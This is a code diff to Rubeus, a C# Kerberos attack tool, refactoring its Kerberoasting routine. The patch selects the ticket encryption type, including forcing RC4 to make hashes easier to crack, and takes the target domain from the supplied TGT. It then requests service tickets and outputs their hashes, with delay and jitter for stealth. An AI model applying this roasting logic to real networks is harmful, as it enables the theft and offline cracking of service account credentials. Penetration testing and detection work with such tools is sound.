@@ -499,6 +499,7 @@ namespace Rubeus
                             }
                             if (TGT != null)
                             {
+                                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
                                 // if a TGT .kirbi is supplied, use that for the request
                                 //      this could be a passed TGT or if TGT delegation is specified
 
@@ -510,28 +511,17 @@ namespace Rubeus
                                    )
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
-                                    Helpers.RandomDelayWithJitter(delay, jitter);
-                                    if (!result && autoenterprise)
-                                    {
-                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);
-                                        Helpers.RandomDelayWithJitter(delay, jitter);
-                                    }
+                                    etype = Interop.KERB_ETYPE.rc4_hmac;
                                 }
-                                else
+                                
+                                bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
+                                Helpers.RandomDelayWithJitter(delay, jitter);
+                                if (!result && autoenterprise)
                                 {
-                                    // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, etype);
                                     Helpers.RandomDelayWithJitter(delay, jitter);
-                                    if (!result && autoenterprise)
-                                    {
-                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);
-                                        Helpers.RandomDelayWithJitter(delay, jitter);
-                                    }
                                 }
                             }
                             else
@@ -724,14 +714,19 @@ namespace Rubeus
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
-            string userDomain = "DOMAIN";
+            string tgtDomain = "DOMAIN";
 
-            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
+            // we can only roast tickets for the domain that we have a TGT for, first determine it's a TGT
+            string serviceName = TGT.tickets[0].sname.name_string[0];
+            if (!serviceName.Equals("krbtgt"))
             {
-                // extract the domain name from the distinguishedname
-                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
-                string domainDN = dnMatch.Groups["Domain"].ToString();
-                userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
+                Console.WriteLine("[X] Unable to request service tickets without a TGT, please rerun and provide a TGT to '/ticket'.");
+                return false;
+            }
+            else
+            {
+                // always use the doamin that our TGT is for
+                tgtDomain = TGT.tickets[0].sname.name_string[1];
             }
             
             // extract out the info needed for the TGS-REQ request
@@ -742,20 +737,12 @@ namespace Rubeus
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
 
             // request the new service ticket
-            byte[] tgsBytes = null;
-            if (domain.ToLower() != userDomain.ToLower())
-            {
-                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);
-            }
-            else
-            {
-                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
-            }
+            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false, false, null, tgtDomain);
 
             if (tgsBytes != null)
             {
                 KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
-                DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
+                DisplayTGShash(tgsKirbi, true, userName, tgtDomain, outFile, simpleOutput);
                 Console.WriteLine();
                 return true;
             }
